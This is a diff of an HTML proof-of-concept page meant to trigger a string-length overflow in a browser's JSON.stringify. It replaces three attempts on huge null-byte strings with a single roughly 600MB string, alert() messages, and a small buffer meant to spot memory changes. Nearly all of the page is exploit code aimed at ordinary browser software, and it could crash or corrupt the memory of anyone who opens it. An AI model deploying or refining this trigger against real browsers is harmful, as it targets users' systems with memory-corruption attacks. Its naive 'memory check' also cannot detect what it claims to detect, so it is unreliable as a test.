@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC v2</title>
+    <title>FastStringifier Overflow PoC with Alert</title>
     <style>
         #trigger {
             margin: 20px;
@@ -17,42 +17,61 @@
         #trigger:hover {
             background-color: #d32f2f;
         }
-        #status {
-            margin: 20px;
-            font-weight: bold;
-            color: darkred;
-        }
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC v2</h1>
-    <p>Click the button to test string length overflow in JSON.stringify.</p>
+    <h1>FastStringifier Overflow PoC</h1>
+    <p>Click to test string length overflow in JSON.stringify with alerts.</p>
     <button id="trigger">Trigger Overflow</button>
-    <div id="status">Idle...</div>
     <script>
-        const status = document.getElementById('trigger');
-        document.getElementById('trigger').addEventListener('click', () => {
-            status.textContent = 'Attempting overflow...';
-            try {
-                // Attempt 1: Original size (715,827,883 bytes, ~682MB)
-                const string1 = "\x00".repeat(715827883);
-                JSON.stringify(string1);
-            } catch (e) {
-                status.textContent = 'Attempt 1 failed, trying next...';
+        function checkMemory() {
+            const buffer = new ArrayBuffer(4096);
+            const view = new Uint8Array(buffer);
+            for (let i = 0; i < view.length; i++) {
+                view[i] = 0xFF;
             }
+            return () => {
+                let changes = [];
+                for (let i = 0; i < view.length; i++) {
+                    if (view[i] !== 0xFF) {
+                        changes.push(`0x${i.toString(16)}: 0x${view[i].toString(16)}`);
+                    }
+                }
+                return changes.length > 0 ? changes.join(', ') : 'No changes';
+            };
+        }
+
+        document.getElementById('trigger').addEventListener('click', async () => {
+            alert('Initiating PoC...');
             try {
-                // Attempt 2: Slightly smaller size (700,000,000 bytes, ~667MB)
-                const string2 = "\x00".repeat(700000000);
-                JSON.stringify(string2);
-            } catch (e) {
-                status.textContent = 'Attempt 2 failed, trying final...';
-            }
-            try {
-                // Attempt 3: Alternative size (720,000,000 bytes, ~686MB)
-                const string3 = "\x00".repeat(720000000);
-                JSON.stringify(string3);
-            } catch (e) {
-                status.textContent = 'All attempts failed.';
+                // Initialize memory checker
+                const check = checkMemory();
+                alert('Memory checker initialized. Starting overflow attempt.');
+
+                // Allocate large string
+                const stringSize = 600000000; // ~600MB
+                alert(`Attempting to allocate string of size ${stringSize} bytes...`);
+                setTimeout(() => {
+                    try {
+                        const string = "\x00".repeat(stringSize);
+                        alert('String allocated successfully. Attempting JSON.stringify...');
+
+                        // Check memory before stringify
+                        const before = check();
+                        alert(`Memory before stringify: ${before}`);
+
+                        // Trigger overflow
+                        JSON.stringify(string);
+
+                        // Check memory after (unlikely to reach here if crash occurs)
+                        const after = check();
+                        alert(`Memory after stringify: ${after}`);
+                    } catch (err) {
+                        alert(`Error: ${err.message}`);
+                    }
+                }, 100);
+            } catch (err) {
+                alert(`Initial error: ${err.message}`);
             }
         });
     </script>
